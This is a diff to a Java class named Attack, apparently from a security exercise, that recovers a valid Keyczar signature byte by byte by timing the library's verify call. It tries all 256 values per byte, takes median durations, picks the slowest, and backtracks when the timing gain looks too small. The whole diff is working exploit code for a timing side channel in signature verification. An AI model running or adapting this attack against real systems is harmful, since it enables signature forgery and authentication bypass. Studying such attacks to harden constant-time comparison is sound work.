@@ -27,8 +27,8 @@ public class Attack {
 
     private static Verifier verifier;
     private static byte[] message;
-
-    private static byte[] correctSignature = new byte[SIGNATURE_LENGTH];
+    private static long[] avgByteDurations;
+    private static byte[] signature;
 
     public static void main(String[] args) throws KeyczarException {
 
@@ -39,19 +39,33 @@ public class Attack {
 
         warmUp(250000);
 
-        byte[] signature = new byte[SIGNATURE_LENGTH]; // signature to guess
+        avgByteDurations = new long[SIGNATURE_LENGTH];
+        signature = new byte[SIGNATURE_LENGTH];
         Arrays.fill(signature, Byte.MIN_VALUE);
 
         for (int i = 0; i < SIGNATURE_LENGTH; i++) {
+            findByte(i);
+
             // todo if avg result time to low then i--
-            findByte(signature, i);
+            if (i > 0) {
+                long durationDelta = avgByteDurations[i] - avgByteDurations[i - 1];
+                if(durationDelta < getAverageDelta(avgByteDurations) / 2) {
+                    i--;
+                }
+            }
         }
 
-        System.out.println(verifier.verify(message, addPrefix(correctSignature)));
-        System.out.println(Arrays.toString(addPrefix(correctSignature)));
+        System.out.println(verifier.verify(message, addPrefix(signature)));
+        System.out.println(Arrays.toString(addPrefix(signature)));
     }
 
-    public static long getMedian(long[] values) {
+    /**
+     * Counts median of given values.
+     * Reorders input.
+     * @param values input values
+     * @return median
+     */
+    private static long getMedian(long[] values) {
         Arrays.sort(values);
         long median;
 
@@ -66,30 +80,59 @@ public class Attack {
         return  median;
     }
 
+    /**
+     * Counts average delta between items i and i + 1. Zero values are not counted.
+     * @param values input values
+     * @return average delta
+     */
+    private static long getAverageDelta(long[] values) {
+        int itemsCounted = 0;
+        long acumulator = 0;
 
-    private static void findByte(byte[] signature, int byteIndex) throws KeyczarException {
+        for (long value : values) {
+            if (value > 0) {
+                acumulator += value;
+                itemsCounted++;
+            } else {
+                break;
+            }
+        }
+
+        return Math.round(acumulator / (double) itemsCounted);
+    }
+
+
+    /**
+     * TODO
+     * @param byteIndex index of byte that should be guessed
+     * @throws KeyczarException ops
+     */
+    private static void findByte(int byteIndex) throws KeyczarException {
         byte maxDurationValue = 0;
         long maxDuration = Integer.MIN_VALUE;
         ByteBuffer messageBuffer = ByteBuffer.wrap(message);
         ByteBuffer signatureBuffer;
+        avgByteDurations[byteIndex] = 0;
 
         for (int i = 0; i < 256; i++) {
             signature[byteIndex] = (byte) (i - Math.abs((int) Byte.MIN_VALUE));
             long[] durations = new long[NUMBER_OF_TRIES];
             long iterationStart;
             warmUp(NUMBER_OF_TRIES / 10);
+
             for (int n = 0; n < NUMBER_OF_TRIES; n++) {
                 signatureBuffer = ByteBuffer.wrap(addPrefix(signature));
-
                 messageBuffer.position(0);
                 signatureBuffer.position(0);
 
-                //verify(ByteBuffer.wrap(data), ByteBuffer.wrap(signature));
                 iterationStart = System.nanoTime();
                 verifier.verify(messageBuffer, signatureBuffer);
                 durations[n] = (System.nanoTime() - iterationStart);
             }
+
             long actualDuration = getMedian(durations);
+
+            avgByteDurations[byteIndex] += actualDuration;
 
             if(actualDuration > maxDuration) {
                 maxDuration = actualDuration;
@@ -99,8 +142,8 @@ public class Attack {
             System.out.printf("Byte %d - input %d - duration %d .\n", byteIndex, (int) signature[byteIndex], actualDuration);
         }
 
+        avgByteDurations[byteIndex] = Math.round(avgByteDurations[byteIndex] / 256d);
         signature[byteIndex] = maxDurationValue;
-        correctSignature[byteIndex] = maxDurationValue; // FIXME: 19.10.2017 drop
     }
 
 
